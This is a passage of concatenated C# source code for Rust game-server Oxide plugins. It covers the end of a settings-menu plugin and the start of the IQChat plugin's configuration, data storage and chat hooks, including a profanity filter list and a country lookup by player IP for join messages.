                                    OffsetMax = $"550 {-25 - x * 25}"
                                }
                            }
                });

                Container.Add(new CuiButton
                {
                    Button = { Color = "1 1 1 0", Command = $"settings.sendcommand {x} {i} -1 {config.pluginSettings.ElementAt(i).Value.command.Replace("%STEAMID%", userID.ToString())}" },
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", },
                    Text = { Text = "", Align = TextAnchor.MiddleCenter }
                }, MenuContent + ".Info" + $".{i}.-1", MenuContent + ".Info" + $".{i}.Btn");
                x++;

                for(int j = 0; j < config.pluginSettings.ElementAt(i).Value.subSettings.Count; j++)
                {
                    string subText = $"<color=#FFFFFF66>☐  {config.pluginSettings.ElementAt(i).Value.subSettings.ElementAt(j).Value.commandDescription}</color>";
                    if (userSettings[userID][config.pluginSettings.ElementAt(i).Key].settings.ElementAt(j).Value.isOn)
                        subText = $"<color=#FFFFFF>☑  {config.pluginSettings.ElementAt(i).Value.subSettings.ElementAt(j).Value.commandDescription}</color>";

                    Container.Add(new CuiElement
                    {
                        Name = MenuContent + ".Info" + $".{i}.{j}",
                        Parent = MenuContent + ".Info",
                        Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = subText,
                                    Align = TextAnchor.MiddleLeft,
                                    FontSize = 16,
                                    Font = "robotocondensed-regular.ttf",
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"60 {-50 - x * 25}",
                                    OffsetMax = $"550 {-25 - x * 25}"
                                }
                            }
                    });
                    Container.Add(new CuiButton
                    {
                        Button = { Color = "1 1 1 0", Command = $"settings.sendcommand {x} {i} {j} {config.pluginSettings.ElementAt(i).Value.subSettings.ElementAt(j).Value.command.Replace("%STEAMID%", userID.ToString())}" },
                        RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", },
                        Text = { Text = "", Align = TextAnchor.MiddleCenter }
                    }, MenuContent + ".Info" + $".{i}.{j}", MenuContent + ".Info" + $".{i}.{j}.Btn");
                    x++;
                }
            }
        }

        [ConsoleCommand("settings.sendcommand")]
        private void SendCommand(ConsoleSystem.Arg arg)
        {
            if (arg.HasArgs(4))
            {
                int x = int.Parse(arg.Args[0]);
                int i = int.Parse(arg.Args[1]);
                int j = int.Parse(arg.Args[2]);

                string command = string.Join(" ", arg.Args.Skip(3));

                rust.RunClientCommand(arg.Player(), command.Replace("%STEAMID%",arg.Player().UserIDString));

                if (j != -1 && config.pluginSettings[i].onlyOne)
                {
                    x = 0;
                    for(int o = 0; o < config.pluginSettings.Count; o++)
                    {
                        x++;
                        if (o >= i)
                            break;

                        for(int p = 0; p < config.pluginSettings.ElementAt(o).Value.subSettings.Count; p++)
                        {
                            x++;
                        }
                    }
                    for(int k = 0; k < config.pluginSettings[i].subSettings.Count; k++)
                    {
                        CuiHelper.DestroyUi(arg.Player(), MenuContent + ".Info" + $".{i}.{k}");
                        if (k != j)
                            userSettings[arg.Connection.userid][i].settings[k].isOn = false;
                        else
                            userSettings[arg.Connection.userid][i].settings[k].isOn = true;

                        CuiElementContainer Container = new CuiElementContainer();
                        bool isOn =userSettings[arg.Connection.userid][i].settings[k].isOn;
                        string subText = $"{(isOn ? "<color=#FFFFFF>☑" : "<color=#FFFFFF66>☐")}  {config.pluginSettings.ElementAt(i).Value.subSettings.ElementAt(k).Value.commandDescription}</color>";
                        Container.Add(new CuiElement
                        {
                            Name = MenuContent + ".Info" + $".{i}.{k}",
                            Parent = MenuContent + ".Info",
                            Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = subText,
                                    Align = TextAnchor.MiddleLeft,
                                    FontSize = 16,
                                    Font = "robotocondensed-regular.ttf",
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"{60} {-50 - x * 25}",
                                    OffsetMax = $"550 {-25 - x * 25}"
                                }
                            }
                        });


                        Container.Add(new CuiButton
                        {
                            Button = { Color = "1 1 1 0", Command = $"settings.sendcommand {x} {i} {k} {config.pluginSettings.ElementAt(i).Value.subSettings.ElementAt(k).Value.command}" },
                            RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", },
                            Text = { Text = "", Align = TextAnchor.MiddleCenter }
                        }, MenuContent + ".Info" + $".{i}.{k}", MenuContent + ".Info" + $".{i}.{k}.Btn");
                        CuiHelper.AddUi(arg.Player(), Container);
                        x++;
                    }
                    return;
                }
                else
                {
                    CuiHelper.DestroyUi(arg.Player(), MenuContent + ".Info" + $".{i}.{j}");

                    if (j != -1)
                    {
                        userSettings[arg.Connection.userid][i].settings[j].isOn = !userSettings[arg.Connection.userid][i].settings[j].isOn;
                    }
                    else
                    {
                        userSettings[arg.Connection.userid][i].isOn = !userSettings[arg.Connection.userid][i].isOn;
                    }

                    bool isOn = j != -1 ? userSettings[arg.Connection.userid][i].settings[j].isOn : userSettings[arg.Connection.userid][i].isOn;
                    CuiElementContainer Container = new CuiElementContainer();
                    string subText = $"{(isOn ? "<color=#FFFFFF>☑" : "<color=#FFFFFF66>☐")}  {(j != -1 ? config.pluginSettings.ElementAt(i).Value.subSettings.ElementAt(j).Value.commandDescription : config.pluginSettings.ElementAt(i).Value.commandDescription)}</color>";
                    Container.Add(new CuiElement
                    {
                        Name = MenuContent + ".Info" + $".{i}.{j}",
                        Parent = MenuContent + ".Info",
                        Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = subText,
                                    Align = TextAnchor.MiddleLeft,
                                    FontSize = 16,
                                    Font = "robotocondensed-regular.ttf",
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"{(j != -1 ? "60" : "30")} {-50 - x * 25}",
                                    OffsetMax = $"550 {-25 - x * 25}"
                                }
                            }
                    });


                    Container.Add(new CuiButton
                    {
                        Button = { Color = "1 1 1 0", Command = $"settings.sendcommand {x} {i} {j} {(j != -1 ? config.pluginSettings.ElementAt(i).Value.subSettings.ElementAt(j).Value.command.Replace("%STEAMID%", arg.Player().userID.ToString()) : config.pluginSettings.ElementAt(i).Value.command.Replace("%STEAMID%", arg.Player().userID.ToString()))}" },
                        RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", },
                        Text = { Text = "", Align = TextAnchor.MiddleCenter }
                    }, MenuContent + ".Info" + $".{i}.{j}", MenuContent + ".Info" + $".{i}.{j}.Btn");
                    CuiHelper.AddUi(arg.Player(), Container);
                }
            }
        }

        #region Utils
        private static string HexToRustFormat(string hex)
        {
            if (string.IsNullOrEmpty(hex))
            {
                hex = "#FFFFFFFF";
            }

            var str = hex.Trim('#');

            if (str.Length == 6)
                str += "FF";

            if (str.Length != 8)
            {
                throw new Exception(hex);
                throw new InvalidOperationException("Cannot convert a wrong format.");
            }

            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
            var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);

            Color color = new Color32(r, g, b, a);

            return $"{color.r:F2} {color.g:F2} {color.b:F2} {color.a:F2}";
        }
        #endregion
    }
}


// --- End of file: Settings.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/IQChat.cs ---
// --- Original Local Path: HudRust/IQChat.cs ---

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using CompanionServer;
using ConVar;
using Facepunch;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Oxide.Core;
using Oxide.Core.Libraries;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("IQChat", "Mercury", "0.3.4")]
    [Description("Самый приятный чат для вашего сервера из ветки IQ")]
    class IQChat : RustPlugin
    {
        /// <summary>
        /// Обновление 0.3.4
        /// - Добавлена поддержка IQRankSystem
        /// - Добавлен дополнительный префикс - Ранг совместно с плагином IQRankSystem
        /// - Добавлено отображение времени отыгранного на сервере - совместно с плагином IQRankSystem
        /// - Добавлен пункт в меню чата "Ранг" с поддержкой IQRankSystem
        /// - Добавлена сортировка по доступным рангам IQRankSystem
        /// - Добавлен пункт Включения/Отключения случайных сообщений при подключении игрока
        /// - Добавлен список случайных сообщений при подключении игрока, так-же с поддержкой его страны
        /// - Добавлен пункт Включения/Отключения случайных сообщений при отключении игрока
        /// - Добавлен список случайных сообщений при отключении игрока, так-же с поддержкой его причины 
        /// - Значительно оптимизировал форматирование сообщений
        /// </summary>


        #region Reference
        [PluginReference] Plugin IQPersonal, IQFakeActive, XDNotifications, IQRankSystem;

        #region IQPersonal
        public void SetMute(BasePlayer player) => IQPersonal?.CallHook("API_SET_MUTE", player.userID);
        public void BadWords(BasePlayer player) => IQPersonal?.CallHook("API_DETECTED_BAD_WORDS", player.userID);
        #endregion

        #region XDNotifications
        private void AddNotify(BasePlayer player, string title, string description, string command = "", string cmdyes = "", string cmdno = "")
        {
            if (!XDNotifications) return;
            var Setting = config.ReferenceSetting.XDNotificationsSettings;
            Interface.Oxide.CallHook("AddNotify", player, title, description, Setting.Color, Setting.AlertDelete, Setting.SoundEffect, command, cmdyes, cmdno);
        }
        #endregion

        #region IQFakeActive
        public bool IsFake(string DisplayName) => (bool)IQFakeActive?.Call("IsFake", DisplayName);
        void SyncReservedFinish()
        {
            if (!config.ReferenceSetting.IQFakeActiveSettings.UseIQFakeActive) return;
            PrintWarning("IQChat - успешно синхронизирована с IQFakeActive");
            PrintWarning("=============SYNC==================");
        }
        #endregion

        #region IQRankSystem
        string IQRankGetRank(ulong userID) => (string)(IQRankSystem?.Call("API_GET_RANK_NAME", userID));
        string IQRankGetTimeGame(ulong userID) => (string)(IQRankSystem?.Call("API_GET_TIME_GAME", userID));
        List<string> IQRankListKey(ulong userID) => (List<string>)(IQRankSystem?.Call("API_RANK_USER_KEYS", userID));
        string IQRankGetNameRankKey(string Key) => (string)(IQRankSystem?.Call("API_GET_RANK_NAME", Key));
        void IQRankSetRank(ulong userID, string RankKey) => IQRankSystem?.Call("API_SET_ACTIVE_RANK", userID, RankKey);
        bool IQRankUserAcces(ulong userID, string RankKey) => (bool)IQRankSystem?.Call("API_GET_RANK_ACCESS", userID, RankKey);

        #endregion

        #endregion

        #region Vars
        public Dictionary<BasePlayer, BasePlayer> PMHistory = new Dictionary<BasePlayer, BasePlayer>();

        public string PermMuteMenu = "muteuse.iqchat";
        class Response
        {
            [JsonProperty("country")]
            public string Country { get; set; }
        }
        public static StringBuilder sb = new StringBuilder();
        public string GetLang(string LangKey, string userID = null, params object[] args)
        {
            sb.Clear();
            if (args != null)
            {
                sb.AppendFormat(lang.GetMessage(LangKey, this, userID), args);
                return sb.ToString();
            }
            return lang.GetMessage(LangKey, this, userID);
        }
        #endregion

        #region Configuration

        private static Configuration config = new Configuration();
        private class Configuration
        {
            [JsonProperty("Права для смены ника")]
            public string RenamePermission;
            [JsonProperty("Настройка префиксов")]
            public List<AdvancedFuncion> PrefixList = new List<AdvancedFuncion>();
            [JsonProperty("Настройка цветов для ников")]
            public List<AdvancedFuncion> NickColorList = new List<AdvancedFuncion>();
            [JsonProperty("Настройка цветов для сообщений")]
            public List<AdvancedFuncion> MessageColorList = new List<AdvancedFuncion>();
            [JsonProperty("Настройка сообщений в чате")]
            public MessageSettings MessageSetting;
            [JsonProperty("Настройка причин блокировок чата")]
            public List<ReasonMuteChat> ReasonListChat = new List<ReasonMuteChat>();
            [JsonProperty("Настройка интерфейса")]
            public InterfaceSettings InterfaceSetting;
            [JsonProperty("Настройка оповещения")]
            public AlertSetting AlertSettings;         
            [JsonProperty("Настройка привилегий")]
            public AutoSetups AutoSetupSetting;
            [JsonProperty("Настройка Rust+")]
            public RustPlus RustPlusSettings;
            [JsonProperty("Дополнительная настройка")]
            public OtherSettings OtherSetting;
            [JsonProperty("Настройка автоответчика")]
            public AnswerMessage AnswerMessages = new AnswerMessage();

            [JsonProperty("Настройка плагинов поддержки")]
            public ReferenceSettings ReferenceSetting = new ReferenceSettings();
            internal class AdvancedFuncion
            {
                [JsonProperty("Права")]
                public string Permissions;
                [JsonProperty("Значение")]
                public string Argument;
            }
            internal class AnswerMessage
            {
                [JsonProperty("Включить автоответчик?(true - да/false - нет)")]
                public bool UseAnswer;
                [JsonProperty("Настройка сообщений [Ключевое слово] = Ответ")]
                public Dictionary<string, string> AnswerMessageList = new Dictionary<string, string>();
            }
            internal class RustPlus
            {
                [JsonProperty("Использовать Rust+")]
                public bool UseRustPlus;
                [JsonProperty("Название для уведомления Rust+")]
                public string DisplayNameAlert;
            }
            internal class ReasonMuteChat
            {
                [JsonProperty("Причина мута")]
                public string Reason;
                [JsonProperty("Время мута")]
                public int TimeMute;
            }
            internal class ReferenceSettings
            {
                [JsonProperty("Настройка XDNotifications")]
                public XDNotifications XDNotificationsSettings = new XDNotifications();
                [JsonProperty("Настройка IQFakeActive")]
                public IQFakeActive IQFakeActiveSettings = new IQFakeActive();
                [JsonProperty("Настройка IQRankSystem")]
                public IQRankSystem IQRankSystems = new IQRankSystem();
                internal class XDNotifications
                {
                    [JsonProperty("Включить поддержку XDNotifications(UI уведомления будут заменены на уведомление с XDNotifications)")]
                    public bool UseXDNotifications;
                    [JsonProperty("Цвет заднего фона уведомления(HEX)")]
                    public string Color;
                    [JsonProperty("Через сколько удалиться уведомление")]
                    public int AlertDelete;
                    [JsonProperty("Звуковой эффект")]
                    public string SoundEffect;
                }
                internal class IQRankSystem
                {
                    [JsonProperty("Использовать поддержку рангов")]
                    public bool UseRankSystem;
                    [JsonProperty("Отображать игрокам их отыгранное время рядом с рангом")]
                    public bool UseTimeStandart;
                }
                internal class IQFakeActive
                {
                    [JsonProperty("Использовать поддержку IQFakeActive")]
                    public bool UseIQFakeActive;
                }
            }
            internal class AutoSetups
            {
                [JsonProperty("Настройки сброса привилегий")]
                public ReturnDefault ReturnDefaultSetting = new ReturnDefault();
                [JsonProperty("Автоматической установки префиксов/цвета ника/цвета чата")]
                public SetupAuto SetupAutoSetting = new SetupAuto();
                internal class ReturnDefault
                {
                    [JsonProperty("Сбрасывать автоматически префикс при окончании его прав")]
                    public bool UseDropPrefix;
                    [JsonProperty("Сбрасывать автоматически цвет ника при окончании его прав")]
                    public bool UseDropColorNick;
                    [JsonProperty("Сбрасывать автоматически цвет чата при окончании его прав")]
                    public bool UseDropColorChat;

                    [JsonProperty("При окончании префикса, установится данный префикс")]
                    public string PrefixDefault;
                    [JsonProperty("При окончании цвета ника, установится данный цвет")]
                    public string NickDefault;
                    [JsonProperty("При окончании цвета сообщения, установится данный цвета")]
                    public string MessageDefault;
                }
                internal class SetupAuto
                {
                    [JsonProperty("Устанавливать автоматически префикс при получении его прав")]
                    public bool UseSetupAutoPrefix;
                    [JsonProperty("Устанавливать автоматически цвет ника при получении его прав")]
                    public bool UseSetupAutoColorNick;
                    [JsonProperty("Устанавливать автоматически цвет чата при получении его прав")]
                    public bool UseSetupAutoColorChat;

                }
            }
            internal class MessageSettings
            {
                [JsonProperty("Включить форматирование сообщений")]
                public bool FormatingMessage;
                [JsonProperty("Включить личные сообщения")]
                public bool PMActivate;
                [JsonProperty("Включить игнор ЛС игрокам(/ignore nick)")]
                public bool IgnoreUsePM;
                [JsonProperty("Включить Анти-Спам")]
                public bool AntiSpamActivate;
                [JsonProperty("Скрыть из чата выдачу предметов Админу")]
                public bool HideAdminGave;
                [JsonProperty("Использовать список запрещенных слов?")]
                public bool UseBadWords;
                [JsonProperty("Включить возможность использовать несколько префиксов сразу")]
                public bool MultiPrefix;
                [JsonProperty("Переносить мут в командный чат(В случае мута,игрок не сможет писать даже в командный чат)")]
                public bool MuteTeamChat;
                [JsonProperty("Пермишенс для иммунитета к антиспаму")]
                public string PermAdminImmunitetAntispam;
                [JsonProperty("Наименование оповещения в чат")]
                public string BroadcastTitle;
                [JsonProperty("Цвет сообщения оповещения в чат")]
                public string BroadcastColor;
                [JsonProperty("На какое сообщение заменять плохие слова")]
                public string ReplaceBadWord;
                [JsonProperty("Звук при при получении личного сообщения")]
                public string SoundPM;            
                [JsonProperty("Время,через которое удалится сообщение с UI от администратора")]
                public int TimeDeleteAlertUI;
                [JsonProperty("Steam64ID для аватарки в чате")]
                public ulong Steam64IDAvatar;
                [JsonProperty("Время через которое игрок может отправлять сообщение (АнтиСпам)")]
                public int FloodTime;
                [JsonProperty("Список плохих слов")]
                public List<string> BadWords = new List<string>();
            }
            internal class InterfaceSettings
            {
                [JsonProperty("Значения для плавного появления")]
                public float FadeIn;
                [JsonProperty("Основной цвет UI")]
                public string MainColor;
                [JsonProperty("Дополнительный цвет UI")]
                public string TwoMainColor;
                [JsonProperty("Цвет кнопок")]
                public string ButtonColor;
                [JsonProperty("Цвет текста")]
                public string LabelColor;
                [JsonProperty("Цвет UI уведомления")]
                public string AlertColor;
                [JsonProperty("Настройка расположения UI уведомления")]
                public AlertInterfaceSettings AlertInterfaceSetting;

                internal class AlertInterfaceSettings
                {
                    [JsonProperty("AnchorMin")]
                    public string AnchorMin;
                    [JsonProperty("AnchorMax")]
                    public string AnchorMax;
                    [JsonProperty("OffsetMin")]
                    public string OffsetMin;
                    [JsonProperty("OffsetMax")]
                    public string OffsetMax;
                }
            }
            internal class AlertSetting
            {
                [JsonProperty("Включить случайное сообщение зашедшему игроку")]
                public bool WelcomeMessageUse;
                [JsonProperty("Список сообщений игроку при входе")]
                public List<string> WelcomeMessage = new List<string>();
                [JsonProperty("Уведомлять о входе игрока в чат")]
                public bool ConnectedAlert;
                [JsonProperty("Включить случайные уведомления о входе игрока из списка")]
                public bool ConnectionAlertRandom;
                [JsonProperty("Случайные уведомления о входе игрока({0} - ник игрока, {1} - страна(если включено отображение страны)")]
                public List<string> RandomConnectionAlert = new List<string>();
                [JsonProperty("Отображать страну зашедшего игрока")]
                public bool ConnectedWorld;
                [JsonProperty("Уведомлять о выходе игрока в чат из списка")]
                public bool DisconnectedAlert;
                [JsonProperty("Включить случайные уведомления о входе игрока")]
                public bool DisconnectedAlertRandom;
                [JsonProperty("Случайные уведомления о входе игрока({0} - ник игрока, {1} - причина выхода(если включена причина)")]
                public List<string> RandomDisconnectedAlert = new List<string>();
                [JsonProperty("Отображать причину выхода игрока")]
                public bool DisconnectedReason;
                [JsonProperty("При уведомлении о входе/выходе игрока отображать его аватар напротив ника")]
                public bool ConnectedAvatarUse;
                [JsonProperty("Включить автоматические сообщения в чат")]
                public bool AlertMessage;
                [JsonProperty("Настройка отправки автоматических сообщений в чат")]
                public List<string> MessageList;
                [JsonProperty("Интервал отправки сообщений в чат(Броадкастер)")]
                public int MessageListTimer;
            }
            internal class OtherSettings
            {
                [JsonProperty("Использовать дискорд")]
                public bool UseDiscord;
                [JsonProperty("Вебхук для логирования чата в дискорд")]
                public string WebhooksChatLog;
                [JsonProperty("Вебхук для логирования информации о мутах в дискорде")]
                public string WebhooksMuteInfo;
            }

            public static Configuration GetNewConfiguration()
            {
                return new Configuration
                {
                    PrefixList = new List<AdvancedFuncion>
                    {
                        new AdvancedFuncion
                        {
                            Permissions = "iqchat.default",
                            Argument = "<color=yellow><b>[+]</b></color>",
                        },
                        new AdvancedFuncion
                        {
                            Permissions = "iqchat.default",
                            Argument = "<color=yellow><b>[ИГРОК]</b></color>",
                        },
                        new AdvancedFuncion
                        {
                            Permissions = "iqchat.vip",
                            Argument = "<color=yellow><b>[VIP]</b></color>",
                        },
                    },
                    NickColorList = new List<AdvancedFuncion>
                    {
                        new AdvancedFuncion
                        {
                            Permissions = "iqchat.default",
                            Argument = "#DBEAEC",
                        },
                        new AdvancedFuncion
                        {
                            Permissions = "iqchat.default",
                            Argument = "#FFC428",
                        },
                        new AdvancedFuncion
                        {
                            Permissions = "iqchat.vip",
                            Argument = "#45AAB4",
                        },
                    },
                    MessageColorList = new List<AdvancedFuncion>
                    {
                        new AdvancedFuncion
                        {
                            Permissions = "iqchat.default",
                            Argument = "#DBEAEC",
                        },
                        new AdvancedFuncion
                        {
                            Permissions = "iqchat.default",
                            Argument = "#FFC428",
                        },
                        new AdvancedFuncion
                        {
                            Permissions = "iqchat.vip",
                            Argument = "#45AAB4",
                        },
                    },
                    AutoSetupSetting = new AutoSetups
                    {
                        ReturnDefaultSetting = new AutoSetups.ReturnDefault
                        {
                            UseDropColorChat = true,
                            UseDropColorNick = true,
                            UseDropPrefix = true,

                            PrefixDefault = "",
                            NickDefault = "",
                            MessageDefault = "",
                        },
                        SetupAutoSetting = new AutoSetups.SetupAuto
                        {
                            UseSetupAutoColorChat = true,
                            UseSetupAutoColorNick = true,
                            UseSetupAutoPrefix = true,
                        }
                    },
                    RustPlusSettings = new RustPlus
                    {
                        UseRustPlus = true,
                        DisplayNameAlert = "СУПЕР СЕРВЕР",
                    },
                    MessageSetting = new MessageSettings
                    {
                        UseBadWords = true,
                        HideAdminGave = true,
                        IgnoreUsePM = true,
                        MuteTeamChat = true,
                        PermAdminImmunitetAntispam = "iqchat.adminspam",
                        BroadcastTitle = "<color=#007FFF><b>[ОПОВЕЩЕНИЕ]</b></color>",
                        BroadcastColor = "#74ade1",
                        ReplaceBadWord = "Ругаюсь матом",
                        Steam64IDAvatar = 0,
                        TimeDeleteAlertUI = 5,
                        PMActivate = true,
                        SoundPM = "assets/bundled/prefabs/fx/notice/stack.world.fx.prefab",
                        AntiSpamActivate = true,
                        FloodTime = 5,
                        FormatingMessage = true,
                        MultiPrefix = true,
                        BadWords = new List<string> { "хуй", "гей", "говно", "бля", "тварь" }
                    },
                    ReasonListChat = new List<ReasonMuteChat>
                    {
                        new ReasonMuteChat
                        {
                            Reason = "Оскорбление родителей",
                            TimeMute = 1200,
                        },
                        new ReasonMuteChat
                        {
                            Reason = "Оскорбление игроков",
                            TimeMute = 100
                        }
                    },
                    RenamePermission = "iqchat.renameuse",                  
                    AlertSettings = new AlertSetting
                    {
                        MessageListTimer = 60,
                        WelcomeMessageUse = true,
                        ConnectionAlertRandom = false,
                        DisconnectedAlertRandom = false,
                        RandomConnectionAlert = new List<string>
                        {
                            "{0} влетел как дурачок из {1}",
                            "{0} залетел на сервер из {1}, соболезнуем",
                            "{0} прыгнул на сервачок"
                        },
                        RandomDisconnectedAlert = new List<string>
                        {
                            "{0} ушел в мир иной",
                            "{0} вылетел с сервера с причиной {1}",
                            "{0} пошел на другой сервачок"
                        },
                        ConnectedAlert = true,
                        ConnectedWorld = true,
                        DisconnectedAlert = true,
                        DisconnectedReason = true,
                        AlertMessage = true,
                        ConnectedAvatarUse = true,
                        MessageList = new List<string>
                        {
                        "Автоматическое сообщение #1",
                        "Автоматическое сообщение #2",
                        "Автоматическое сообщение #3",
                        "Автоматическое сообщение #4",
                        "Автоматическое сообщение #5",
                        "Автоматическое сообщение #6",
                        },
                        WelcomeMessage = new List<string>
                        {
                            "Добро пожаловать на сервер SUPERSERVER\nРады,что выбрал именно нас!",
                            "С возвращением на сервер!\nЖелаем тебе удачи",
                            "Добро пожаловать на сервер\nУ нас самые лучшие плагины",
                        },

                    },
                    InterfaceSetting = new InterfaceSettings
                    {
                        FadeIn = 0.2f,
                        MainColor = "#000000C0",
                        TwoMainColor = "#762424FF",
                        ButtonColor = "#802A2AFF",
                        LabelColor = "#D1C7BEFF",
                        AlertColor = "#802A2AFF",
                        AlertInterfaceSetting = new InterfaceSettings.AlertInterfaceSettings
                        {
                            AnchorMin = "0 1",
                            AnchorMax = "0 1",
                            OffsetMin = "0 -90",
                            OffsetMax = "320 -20"
                        }
                    }, 
                    OtherSetting = new OtherSettings
                    {
                        UseDiscord = false,
                        WebhooksChatLog = "",
                        WebhooksMuteInfo = "",
                    },
                    AnswerMessages = new AnswerMessage
                    {
                        UseAnswer = true,
                        AnswerMessageList = new Dictionary<string, string>
                        {
                            ["вайп"] = "Вайп будет 27.06",
                            ["wipe"] = "Вайп будет 27.06",
                            ["читер"] = "Нашли читера?Напиши /report и отправь жалобу"
                        }
                    },
                    ReferenceSetting = new ReferenceSettings
                    {
                        XDNotificationsSettings = new ReferenceSettings.XDNotifications
                        {                         
                            UseXDNotifications = false,
                            AlertDelete = 5,
                            Color = "#762424FF",
                            SoundEffect = "",
                        },
                        IQFakeActiveSettings = new ReferenceSettings.IQFakeActive
                        {
                            UseIQFakeActive = true,
                        },
                        IQRankSystems = new ReferenceSettings.IQRankSystem
                        {
                            UseRankSystem = false,
                            UseTimeStandart = true
                        }
                    }
                };
            }
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                config = Config.ReadObject<Configuration>();
                if (config == null) LoadDefaultConfig();
            }
            catch
            {
                PrintWarning("Ошибка #132" + $"чтения конфигурации 'oxide/config/{Name}', создаём новую конфигурацию!!");
                LoadDefaultConfig();
            }
            NextTick(SaveConfig);
        }

        void RegisteredPermissions()
        {
            for (int MsgColor = 0; MsgColor < config.MessageColorList.Count; MsgColor++)
                if (!permission.PermissionExists(config.MessageColorList[MsgColor].Permissions, this))
                    permission.RegisterPermission(config.MessageColorList[MsgColor].Permissions, this);

            for (int NickColorList = 0; NickColorList < config.NickColorList.Count; NickColorList++)
                if (!permission.PermissionExists(config.NickColorList[NickColorList].Permissions, this))
                    permission.RegisterPermission(config.NickColorList[NickColorList].Permissions, this);

            for (int PrefixList = 0; PrefixList < config.PrefixList.Count; PrefixList++)
                if (!permission.PermissionExists(config.PrefixList[PrefixList].Permissions, this))
                    permission.RegisterPermission(config.PrefixList[PrefixList].Permissions, this);

            permission.RegisterPermission(config.RenamePermission, this);
            permission.RegisterPermission(PermMuteMenu, this);
            permission.RegisterPermission(config.MessageSetting.PermAdminImmunitetAntispam,this);
            PrintWarning("Permissions - completed");
        }

        protected override void LoadDefaultConfig() => config = Configuration.GetNewConfiguration();
        protected override void SaveConfig() => Config.WriteObject(config);

        #endregion

        #region Data
        [JsonProperty("Дата с настройкой чата игрока")]
         public Dictionary<ulong, SettingUser> ChatSettingUser = new Dictionary<ulong, SettingUser>();
        [JsonProperty("Дата с Административной настройкой")] public AdminSettings AdminSetting = new AdminSettings();
        public class SettingUser
        {
            public string ChatPrefix;
            public List<string> MultiPrefix = new List<string>();
            public string NickColor;
            public string MessageColor;
            public double MuteChatTime;
            public double MuteVoiceTime;
            public List<ulong> IgnoredUsers = new List<ulong>();
        }

        public class AdminSettings
        {
            public bool MuteChatAll;
            public bool MuteVoiceAll;
            public Dictionary<ulong, string> RenameList = new Dictionary<ulong, string>()
;        }
        void ReadData()
        {
            ChatSettingUser = Oxide.Core.Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, SettingUser>>("IQChat/IQUser");
            AdminSetting = Oxide.Core.Interface.Oxide.DataFileSystem.ReadObject<AdminSettings>("IQChat/AdminSetting");
        }
        void WriteData()
        {
            Oxide.Core.Interface.Oxide.DataFileSystem.WriteObject("IQChat/IQUser", ChatSettingUser);
            Oxide.Core.Interface.Oxide.DataFileSystem.WriteObject("IQChat/AdminSetting", AdminSetting);
        }

        void RegisteredDataUser(BasePlayer player)
        {
            if (!ChatSettingUser.ContainsKey(player.userID))
                ChatSettingUser.Add(player.userID, new SettingUser
                {
                    ChatPrefix = config.AutoSetupSetting.ReturnDefaultSetting.PrefixDefault,
                    NickColor = config.AutoSetupSetting.ReturnDefaultSetting.NickDefault,
                    MessageColor = config.AutoSetupSetting.ReturnDefaultSetting.MessageDefault,
                    MuteChatTime = 0,
                    MuteVoiceTime = 0,
                    MultiPrefix = new List<string> { },
                    IgnoredUsers = new List<ulong> { },
                    
                });
        }

        #endregion

        #region Hooks     
        private bool OnPlayerChat(BasePlayer player, string message, Chat.ChatChannel channel)
        {
            if (Interface.Oxide.CallHook("CanChatMessage", player, message) != null) return false;
            SeparatorChat(channel, player, message);
            return false;
        }
        private object OnServerMessage(string message, string name)
        {
            if (config.MessageSetting.HideAdminGave)
                if (message.Contains("gave") && name == "SERVER")
                    return true;
            return null;
        }
        void OnUserPermissionGranted(string id, string permName) => AutoSetupData(id, permName);
        private void OnUserGroupAdded(string id, string groupName)
        {
            var PermissionsGroup = permission.GetGroupPermissions(groupName);
            if (PermissionsGroup == null) return;
            foreach (var permName in PermissionsGroup)
                AutoSetupData(id, permName); 
        }
        void OnUserPermissionRevoked(string id, string permName) => AutoReturnDefaultData(id, permName);
        void OnUserGroupRemoved(string id, string groupName)
        {
            var PermissionsGroup = permission.GetGroupPermissions(groupName);
            if (PermissionsGroup == null) return;
            foreach (var permName in PermissionsGroup)
                AutoReturnDefaultData(id, permName);
        }
        object OnPlayerVoice(BasePlayer player, Byte[] data)
        {
            var DataPlayer = ChatSettingUser[player.userID];
            bool IsMuted = DataPlayer.MuteVoiceTime > CurrentTime() ? true : false;
            if (IsMuted)
                return false;
            return null;
        }

        private void OnServerInitialized()
        {
            ReadData();
            foreach (var p in BasePlayer.activePlayerList)
                RegisteredDataUser(p);

            RegisteredPermissions();
            WriteData();
            BroadcastAuto();
        }
        void OnPlayerConnected(BasePlayer player)
        {
            RegisteredDataUser(player);
            var Alert = config.AlertSettings;
            if (Alert.ConnectedAlert)
            {
                string Avatar = Alert.ConnectedAvatarUse ? player.UserIDString : "";
                string Message = string.Empty;
                if (config.AlertSettings.ConnectedWorld)
                {
                    webrequest.Enqueue("http://ip-api.com/json/" + player.net.connection.ipaddress.Split(':')[0], null, (code, response) =>
                    {
                        if (code != 200 || response == null)
                            return;

                        string country = JsonConvert.DeserializeObject<Response>(response).Country;

                        if (Alert.ConnectionAlertRandom)
                        {
                            sb.Clear();
                            int RandomIndex = UnityEngine.Random.Range(0, Alert.RandomConnectionAlert.Count);
                            Message = sb.AppendFormat(Alert.RandomConnectionAlert[RandomIndex], player.displayName, country).ToString();
